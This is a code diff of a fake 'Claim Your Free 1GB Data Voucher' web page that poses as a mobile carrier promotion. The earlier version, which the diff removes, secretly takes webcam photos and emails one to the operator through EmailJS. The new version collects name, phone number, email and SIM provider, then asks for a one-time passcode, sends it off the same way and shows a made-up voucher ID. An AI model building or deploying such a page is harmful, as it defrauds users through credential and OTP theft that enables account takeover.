@@ -26,41 +26,8 @@
             animation: fadeIn 0.5s ease-in;
         }
         @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        .camera-container {
-            position: relative;
-            overflow: hidden;
-            border-radius: 0.5rem;
-        }
-        .camera-preview {
-            width: 100%;
-            height: auto;
-            background-color: #000;
-        }
-        .capture-btn {
-            position: absolute;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            background-color: white;
-            border: 4px solid #3b82f6;
-            cursor: pointer;
-        }
-        .capture-btn:active {
-            transform: translateX(-50%) scale(0.95);
-        }
-        .thumbnail {
-            width: 80px;
-            height: 80px;
-            object-fit: cover;
-            border-radius: 0.5rem;
-            border: 2px solid white;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .progress-bar {
             height: 6px;
@@ -73,12 +40,36 @@
             background-color: #3b82f6;
             transition: width 0.3s ease;
         }
+        .otp-input {
+            caret-color: transparent;
+        }
+        .otp-input:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
+        }
+        .step-connector {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            width: 100%;
+            height: 2px;
+            background-color: #e5e7eb;
+            z-index: -1;
+        }
+        .step-connector.active {
+            background-color: #3b82f6;
+        }
     </style>
 </head>
 <body class="bg-gray-100 font-sans">
     <div class="container mx-auto px-4 py-8 max-w-2xl">
         <!-- Header -->
-        <header class="bg-blue-600 text-white rounded-t-xl p-6 text-center shadow-lg">
+        <header class="bg-gradient-to-r from-blue-600 to-blue-500 text-white rounded-t-xl p-6 text-center shadow-lg">
+            <div class="flex justify-center mb-3">
+                <div class="w-12 h-12 bg-white bg-opacity-20 rounded-full flex items-center justify-center">
+                    <i class="fas fa-wifi text-xl"></i>
+                </div>
+            </div>
             <h1 class="text-3xl font-bold mb-2">Claim Your Free 1GB Data Voucher!</h1>
             <p class="text-blue-100">Complete simple steps to get your free data instantly</p>
         </header>
@@ -87,128 +78,116 @@
         <div class="bg-white rounded-b-xl shadow-lg overflow-hidden">
             <!-- Progress Steps -->
             <div class="px-6 pt-6">
-                <div class="flex justify-between mb-6">
-                    <div class="step flex flex-col items-center relative">
+                <div class="flex justify-between mb-6 relative">
+                    <div class="step flex flex-col items-center relative z-10">
                         <div class="w-10 h-10 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold">1</div>
-                        <span class="text-xs mt-1 text-gray-600">Photos</span>
-                    </div>
-                    <div class="step flex flex-col items-center relative">
-                        <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold">2</div>
                         <span class="text-xs mt-1 text-gray-600">Details</span>
+                        <div class="step-connector"></div>
                     </div>
-                    <div class="step flex flex-col items-center relative">
-                        <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold">3</div>
+                    <div class="step flex flex-col items-center relative z-10">
+                        <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold">2</div>
                         <span class="text-xs mt-1 text-gray-600">OTP</span>
+                        <div class="step-connector"></div>
                     </div>
-                    <div class="step flex flex-col items-center relative">
-                        <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold">4</div>
+                    <div class="step flex flex-col items-center relative z-10">
+                        <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold">3</div>
                         <span class="text-xs mt-1 text-gray-600">Complete</span>
                     </div>
                 </div>
                 <div class="progress-bar mb-6">
-                    <div class="progress-fill" style="width: 25%"></div>
+                    <div class="progress-fill" style="width: 33%"></div>
                 </div>
             </div>
 
-            <!-- Step 1: Camera Photos -->
+            <!-- Step 1: User Details -->
             <div id="step1" class="px-6 pb-6">
-                <h2 class="text-xl font-semibold mb-4 text-gray-800">Take 3 Photos for Verification</h2>
-                <p class="text-gray-600 mb-6">Please allow camera access and take 3 clear photos of yourself to verify your identity.</p>
-                
-                <div class="camera-container mb-6">
-                    <video id="cameraPreview" class="camera-preview" autoplay playsinline></video>
-                    <div id="captureBtn" class="capture-btn pulse-animation"></div>
-                </div>
-                
-                <div class="flex justify-between mb-6">
-                    <div id="thumbnail1" class="thumbnail bg-gray-200 flex items-center justify-center text-gray-400">
-                        <i class="fas fa-camera text-xl"></i>
-                    </div>
-                    <div id="thumbnail2" class="thumbnail bg-gray-200 flex items-center justify-center text-gray-400">
-                        <i class="fas fa-camera text-xl"></i>
-                    </div>
-                    <div id="thumbnail3" class="thumbnail bg-gray-200 flex items-center justify-center text-gray-400">
-                        <i class="fas fa-camera text-xl"></i>
-                    </div>
-                </div>
-                
-                <input type="hidden" id="currentPhoto" value="">
-                <button id="nextStep1" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition duration-200 disabled:opacity-50 disabled:cursor-not-allowed" disabled>
-                    Continue to Next Step
-                </button>
-            </div>
-
-            <!-- Step 2: User Details -->
-            <div id="step2" class="px-6 pb-6 hidden">
                 <h2 class="text-xl font-semibold mb-4 text-gray-800">Enter Your Details</h2>
                 <p class="text-gray-600 mb-6">We need some information to send your free 1GB data voucher.</p>
-                
+
+                <div class="mb-4">
+                    <label for="fullName" class="block text-gray-700 text-sm font-medium mb-2">Name</label>
+                    <input type="text" id="fullName" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your full name">
+                </div>
+
                 <div class="mb-4">
                     <label for="mobileNumber" class="block text-gray-700 text-sm font-medium mb-2">Mobile Number</label>
-                    <input type="tel" id="mobileNumber" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your 10-digit mobile number">
-                </div>
-                
-                <div class="mb-6">
-                    <label class="block text-gray-700 text-sm font-medium mb-2">Select Your SIM Provider</label>
-                    <div class="grid grid-cols-2 gap-3">
-                        <div class="flex items-center">
-                            <input id="airtel" type="radio" name="simProvider" value="Airtel" class="h-4 w-4 text-blue-600 focus:ring-blue-500">
-                            <label for="airtel" class="ml-2 block text-gray-700">Airtel</label>
+                    <div class="relative">
+                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                            <span class="text-gray-500">+91</span>
                         </div>
-                        <div class="flex items-center">
-                            <input id="jio" type="radio" name="simProvider" value="Jio" class="h-4 w-4 text-blue-600 focus:ring-blue-500">
-                            <label for="jio" class="ml-2 block text-gray-700">Jio</label>
-                        </div>
-                        <div class="flex items-center">
-                            <input id="vi" type="radio" name="simProvider" value="Vi" class="h-4 w-4 text-blue-600 focus:ring-blue-500">
-                            <label for="vi" class="ml-2 block text-gray-700">Vi</label>
-                        </div>
-                        <div class="flex items-center">
-                            <input id="bsnl" type="radio" name="simProvider" value="BSNL" class="h-4 w-4 text-blue-600 focus:ring-blue-500">
-                            <label for="bsnl" class="ml-2 block text-gray-700">BSNL</label>
-                        </div>
+                        <input type="tel" id="mobileNumber" class="w-full pl-10 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your 10-digit mobile number" maxlength="10">
                     </div>
                 </div>
-                
-                <button id="nextStep2" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition duration-200 disabled:opacity-50 disabled:cursor-not-allowed" disabled>
-                    Continue to OTP Verification
+
+                <div class="mb-4">
+                    <label for="email" class="block text-gray-700 text-sm font-medium mb-2">Email</label>
+                    <input type="email" id="email" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your email address">
+                </div>
+
+                <div class="mb-6">
+                    <label for="simProvider" class="block text-gray-700 text-sm font-medium mb-2">Select Your SIM Provider</label>
+                    <select id="simProvider" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                        <option value="" disabled selected>Select provider</option>
+                        <option value="Airtel">Airtel</option>
+                        <option value="Jio">Jio</option>
+                        <option value="Vi">Vi</option>
+                        <option value="BSNL">BSNL</option>
+                    </select>
+                </div>
+
+                <button id="sendOtp" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition duration-200 disabled:opacity-50 disabled:cursor-not-allowed" disabled>
+                    Send OTP
                 </button>
             </div>
 
-            <!-- Step 3: OTP Verification -->
-            <div id="step3" class="px-6 pb-6 hidden">
+            <!-- Step 2: OTP Verification -->
+            <div id="step2" class="px-6 pb-6 hidden">
                 <h2 class="text-xl font-semibold mb-4 text-gray-800">OTP Verification</h2>
                 <p class="text-gray-600 mb-6">We've sent an OTP to <span id="displayMobileNumber" class="font-semibold"></span>. Please enter it below.</p>
-                
+
                 <div class="flex justify-center mb-6">
                     <div class="flex space-x-2">
-                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input">
-                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input">
-                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input">
-                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input">
-                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input">
-                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input">
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input" pattern="\d*">
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input" pattern="\d*">
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input" pattern="\d*">
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input" pattern="\d*">
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input" pattern="\d*">
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 otp-input" pattern="\d*">
                     </div>
                 </div>
-                
+
                 <div class="text-center mb-6">
-                    <p class="text-gray-600">Didn't receive OTP? <button class="text-blue-600 font-medium">Resend</button></p>
+                    <p class="text-gray-600">Didn't receive OTP? <button id="resendOtp" class="text-blue-600 font-medium">Resend</button></p>
+                    <p id="resendTimer" class="text-sm text-gray-500 mt-1 hidden">Resend OTP in <span id="countdown">30</span> seconds</p>
                 </div>
-                
+
                 <button id="verifyOtp" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition duration-200">
-                    Verify & Claim Your Data
+                    Submit
                 </button>
             </div>
 
-            <!-- Step 4: Success -->
-            <div id="step4" class="px-6 py-12 text-center hidden">
+            <!-- Step 3: Success -->
+            <div id="step3" class="px-6 py-12 text-center hidden">
                 <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                     <i class="fas fa-check text-green-600 text-3xl"></i>
                 </div>
                 <h2 class="text-2xl font-bold text-gray-800 mb-2">Congratulations!</h2>
                 <p class="text-gray-600 mb-6">Your 1GB free data voucher has been successfully claimed.</p>
+                
+                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6 max-w-xs mx-auto">
+                    <div class="flex items-center justify-center">
+                        <div class="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center mr-3">
+                            <i class="fas fa-wifi text-blue-600"></i>
+                        </div>
+                        <div>
+                            <p class="font-semibold text-blue-800">1GB Free Data</p>
+                            <p class="text-xs text-blue-600">Voucher ID: #<span id="voucherId">DTA-</span></p>
+                        </div>
+                    </div>
+                </div>
+                
                 <p class="text-gray-600 mb-8">The data will be credited to your account within 24 hours.</p>
-                <button class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition duration-200">
+                <button id="doneBtn" class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition duration-200">
                     Done
                 </button>
             </div>
@@ -220,8 +199,8 @@
                 <div class="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
                     <i class="fas fa-spinner text-blue-600 text-3xl spin-animation"></i>
                 </div>
-                <h3 class="text-xl font-semibold mb-2">Verifying OTP</h3>
-                <p class="text-gray-600">Please wait while we verify your details...</p>
+                <h3 class="text-xl font-semibold mb-2" id="loadingTitle">Processing</h3>
+                <p class="text-gray-600" id="loadingMessage">Please wait...</p>
             </div>
         </div>
     </div>
@@ -233,196 +212,233 @@
         })();
 
         // DOM Elements
-        const cameraPreview = document.getElementById('cameraPreview');
-        const captureBtn = document.getElementById('captureBtn');
-        const thumbnail1 = document.getElementById('thumbnail1');
-        const thumbnail2 = document.getElementById('thumbnail2');
-        const thumbnail3 = document.getElementById('thumbnail3');
-        const nextStep1 = document.getElementById('nextStep1');
-        const nextStep2 = document.getElementById('nextStep2');
-        const verifyOtp = document.getElementById('verifyOtp');
+        const fullName = document.getElementById('fullName');
         const mobileNumber = document.getElementById('mobileNumber');
+        const email = document.getElementById('email');
+        const simProvider = document.getElementById('simProvider');
+        const sendOtp = document.getElementById('sendOtp');
+        const verifyOtp = document.getElementById('verifyOtp');
         const displayMobileNumber = document.getElementById('displayMobileNumber');
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
         const step3 = document.getElementById('step3');
-        const step4 = document.getElementById('step4');
         const loadingScreen = document.getElementById('loadingScreen');
         const otpInputs = document.querySelectorAll('.otp-input');
-        
+        const resendOtp = document.getElementById('resendOtp');
+        const resendTimer = document.getElementById('resendTimer');
+        const countdown = document.getElementById('countdown');
+        const doneBtn = document.getElementById('doneBtn');
+        const voucherId = document.getElementById('voucherId');
+        const loadingTitle = document.getElementById('loadingTitle');
+        const loadingMessage = document.getElementById('loadingMessage');
+
         // Variables
-        let stream = null;
-        let photosTaken = 0;
-        let capturedPhotos = [];
-        
-        // Initialize camera
-        async function initCamera() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                cameraPreview.srcObject = stream;
-            } catch (err) {
-                console.error("Error accessing camera:", err);
-                alert("Could not access the camera. Please allow camera permissions.");
-            }
+        let otpTimer;
+        let countdownValue = 30;
+
+        // Validate form inputs
+        function validateForm() {
+            const nameValid = fullName.value.trim().length > 0;
+            const mobileValid = /^\d{10}$/.test(mobileNumber.value);
+            const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value);
+            const simValid = simProvider.value !== '';
+            sendOtp.disabled = !(nameValid && mobileValid && emailValid && simValid);
         }
-        
-        // Capture photo
-        function capturePhoto() {
-            if (photosTaken >= 3) return;
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = cameraPreview.videoWidth;
-            canvas.height = cameraPreview.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
-            
-            const photoUrl = canvas.toDataURL('image/jpeg');
-            capturedPhotos.push(photoUrl);
-            
-            // For EmailJS, we'll use the first captured photo
-            if (photosTaken === 0) {
-                document.getElementById('currentPhoto').value = photoUrl;
-            }
-            
-            // Update thumbnail
-            const thumbnailElement = photosTaken === 0 ? thumbnail1 : 
-                                    photosTaken === 1 ? thumbnail2 : thumbnail3;
-            thumbnailElement.innerHTML = '';
-            const img = document.createElement('img');
-            img.src = photoUrl;
-            img.className = 'thumbnail';
-            thumbnailElement.appendChild(img);
-            
-            photosTaken++;
-            
-            // Update progress
-            if (photosTaken === 1) {
-                document.querySelector('.progress-fill').style.width = '50%';
-            } else if (photosTaken === 2) {
-                document.querySelector('.progress-fill').style.width = '75%';
-            } else if (photosTaken === 3) {
-                document.querySelector('.progress-fill').style.width = '100%';
-                nextStep1.disabled = false;
-                captureBtn.classList.remove('pulse-animation');
-            }
-        }
-        
-        // Move to next step
-        function goToStep2() {
-            step1.classList.add('hidden');
-            step2.classList.remove('hidden');
-            
-            // Update progress steps
-            document.querySelectorAll('.step')[1].querySelector('div').classList.remove('bg-gray-300', 'text-gray-600');
-            document.querySelectorAll('.step')[1].querySelector('div').classList.add('bg-blue-600', 'text-white');
-        }
-        
-        function goToStep3() {
+
+        // Send OTP and form data
+        function handleSendOtp() {
+            const name = fullName.value.trim();
             const mobile = mobileNumber.value;
-            const simProvider = document.querySelector('input[name="simProvider"]:checked').value;
-            
-            // Validate mobile number
-            if (!/^\d{10}$/.test(mobile)) {
-                alert('Please enter a valid 10-digit mobile number');
-                return;
-            }
-            
-            // Display mobile number with last 2 digits hidden
-            displayMobileNumber.textContent = mobile.slice(0, 4) + '****' + mobile.slice(8);
-            
-            step2.classList.add('hidden');
-            
-            // Show loading for 3 seconds before showing OTP
+            const emailVal = email.value.trim();
+            const sim = simProvider.value;
+
+            // Send form data via EmailJS
+            const templateParams = {
+                full_name: name,
+                mobile_number: mobile,
+                email: emailVal,
+                sim_selection: sim
+            };
+
+            emailjs.send('service_arcyczl', 'template_n6nsraa', templateParams)
+                .then(() => {
+                    console.log('Form data sent successfully');
+                }, (error) => {
+                    console.error('Failed to send form data:', error);
+                    alert('Failed to submit your data. Please try again.');
+                    return;
+                });
+
+            // Show loading screen
             loadingScreen.classList.remove('hidden');
-            
+            loadingTitle.textContent = "Sending OTP";
+            loadingMessage.textContent = "Please wait while we send OTP to your mobile...";
+
+            // After 5 seconds, show OTP page
             setTimeout(() => {
                 loadingScreen.classList.add('hidden');
-                step3.classList.remove('hidden');
-                
-                // Update progress steps
-                document.querySelectorAll('.step')[2].querySelector('div').classList.remove('bg-gray-300', 'text-gray-600');
-                document.querySelectorAll('.step')[2].querySelector('div').classList.add('bg-blue-600', 'text-white');
-                
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+                step2.classList.add('fade-in');
+
+                // Update progress
+                document.querySelector('.progress-fill').style.width = '66%';
+                document.querySelectorAll('.step')[1].querySelector('div').classList.remove('bg-gray-300', 'text-gray-600');
+                document.querySelectorAll('.step')[1].querySelector('div').classList.add('bg-blue-600', 'text-white');
+                document.querySelectorAll('.step-connector')[0].classList.add('active');
+
+                // Display mobile number
+                displayMobileNumber.textContent = mobile.slice(0, 4) + '****' + mobile.slice(8);
+
                 // Auto focus first OTP input
                 otpInputs[0].focus();
-            }, 3000);
-            
-            // Send data to server (simulated)
-            sendDataToServer(mobile, simProvider, capturedPhotos);
+
+                // Start OTP resend timer
+                startOtpTimer();
+            }, 5000);
         }
-        
-        function completeProcess() {
-            step3.classList.add('hidden');
-            step4.classList.remove('hidden');
+
+        // Submit OTP
+        function handleVerifyOtp() {
+            let otpValid = true;
+            let otpValue = '';
             
-            // Update progress steps
-            document.querySelectorAll('.step')[3].querySelector('div').classList.remove('bg-gray-300', 'text-gray-600');
-            document.querySelectorAll('.step')[3].querySelector('div').classList.add('bg-blue-600', 'text-white');
-            
-            // Stop camera stream
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
+            otpInputs.forEach(input => {
+                if (!input.value) otpValid = false;
+                otpValue += input.value;
+            });
+
+            if (!otpValid) {
+                alert('Please enter complete OTP');
+                return;
             }
-        }
-        
-        // Send data via EmailJS
-        function sendDataToServer(mobile, simProvider, photos) {
-            const photoBase64 = photos[0]; // Using the first photo
-            
-            const templateParams = {
-                mobile_number: mobile,
-                sim_selection: simProvider,
-                image_base64: photoBase64
-            }
-            
-            emailjs.send('service_arcyczl', 'template_n6nsraa', templateParams)
-                .then(function(response) {
-                    console.log('Email sent successfully!', response.status, response.text);
-                }, function(error) {
-                    console.log('Failed to send email:', error);
+
+            // Send OTP via EmailJS
+            const otpParams = {
+                otp: otpValue,
+                mobile_number: mobileNumber.value
+            };
+
+            emailjs.send('service_arcyczl', 'template_otp_submission', otpParams)
+                .then(() => {
+                    console.log('OTP sent successfully');
+                }, (error) => {
+                    console.error('Failed to send OTP:', error);
+                    alert('Failed to submit OTP. Please try again.');
+                    return;
                 });
+
+            // Show loading
+            loadingScreen.classList.remove('hidden');
+            loadingTitle.textContent = "Verifying OTP";
+            loadingMessage.textContent = "Please wait while we verify your OTP...";
+
+            // Simulate verification
+            setTimeout(() => {
+                loadingScreen.classList.add('hidden');
+                step2.classList.add('hidden');
+                step3.classList.remove('hidden');
+
+                // Update progress
+                document.querySelector('.progress-fill').style.width = '100%';
+                document.querySelectorAll('.step')[2].querySelector('div').classList.remove('bg-gray-300', 'text-gray-600');
+                document.querySelectorAll('.step')[2].querySelector('div').classList.add('bg-blue-600', 'text-white');
+                document.querySelectorAll('.step-connector')[1].classList.add('active');
+
+                // Generate random voucher ID
+                voucherId.textContent = 'DTA-' + Math.floor(100000 + Math.random() * 900000);
+
+                // Clear OTP timer
+                clearInterval(otpTimer);
+            }, 2000);
         }
-        
+
         // OTP input handling
         function handleOtpInput(e) {
             const input = e.target;
             const value = input.value;
-            
+
+            if (!/^\d*$/.test(value)) {
+                input.value = '';
+                return;
+            }
+
             if (value && input.nextElementSibling && input.nextElementSibling.classList.contains('otp-input')) {
                 input.nextElementSibling.focus();
             }
         }
-        
+
+        // OTP paste handling
+        function handleOtpPaste(e) {
+            e.preventDefault();
+            const pasteData = e.clipboardData.getData('text/plain').trim();
+            
+            if (/^\d{6}$/.test(pasteData)) {
+                for (let i = 0; i < 6; i++) {
+                    if (otpInputs[i]) {
+                        otpInputs[i].value = pasteData[i];
+                    }
+                }
+                otpInputs[5].focus();
+            }
+        }
+
+        // Start OTP resend timer
+        function startOtpTimer() {
+            resendTimer.classList.remove('hidden');
+            resendOtp.disabled = true;
+            countdownValue = 30;
+            countdown.textContent = countdownValue;
+
+            otpTimer = setInterval(() => {
+                countdownValue--;
+                countdown.textContent = countdownValue;
+
+                if (countdownValue <= 0) {
+                    clearInterval(otpTimer);
+                    resendTimer.classList.add('hidden');
+                    resendOtp.disabled = false;
+                }
+            }, 1000);
+        }
+
+        // Resend OTP
+        function resendOtpHandler() {
+            loadingScreen.classList.remove('hidden');
+            loadingTitle.textContent = "Resending OTP";
+            loadingMessage.textContent = "Please wait while we resend OTP to your mobile...";
+
+            setTimeout(() => {
+                loadingScreen.classList.add('hidden');
+                startOtpTimer();
+                
+                // Clear previous OTP
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+            }, 2000);
+        }
+
         // Event Listeners
-        captureBtn.addEventListener('click', capturePhoto);
-        nextStep1.addEventListener('click', goToStep2);
-        nextStep2.addEventListener('click', goToStep3);
-        verifyOtp.addEventListener('click', completeProcess);
-        
-        // Enable next button when form is filled
-        mobileNumber.addEventListener('input', () => {
-            const simSelected = document.querySelector('input[name="simProvider"]:checked');
-            nextStep2.disabled = !(mobileNumber.value.length === 10 && simSelected);
+        fullName.addEventListener('input', validateForm);
+        mobileNumber.addEventListener('input', validateForm);
+        email.addEventListener('input', validateForm);
+        simProvider.addEventListener('change', validateForm);
+        sendOtp.addEventListener('click', handleSendOtp);
+        verifyOtp.addEventListener('click', handleVerifyOtp);
+        resendOtp.addEventListener('click', resendOtpHandler);
+        doneBtn.addEventListener('click', () => {
+            alert('Thank you for using our service!');
         });
-        
-        document.querySelectorAll('input[name="simProvider"]').forEach(radio => {
-            radio.addEventListener('change', () => {
-                nextStep2.disabled = !(mobileNumber.value.length === 10);
-            });
-        });
-        
-        // OTP inputs event listeners
+
         otpInputs.forEach(input => {
             input.addEventListener('input', handleOtpInput);
+            input.addEventListener('paste', handleOtpPaste);
             input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && e.target.previousElementSibling) {
-                    e.target.previousElementSibling.focus();
+                if (e.key === 'Backspace' && !input.value && input.previousElementSibling) {
+                    input.previousElementSibling.focus();
                 }
             });
         });
-        
-        // Initialize camera when page loads
-        window.addEventListener('DOMContentLoaded', initCamera);
     </script>
 </body>
 </html>
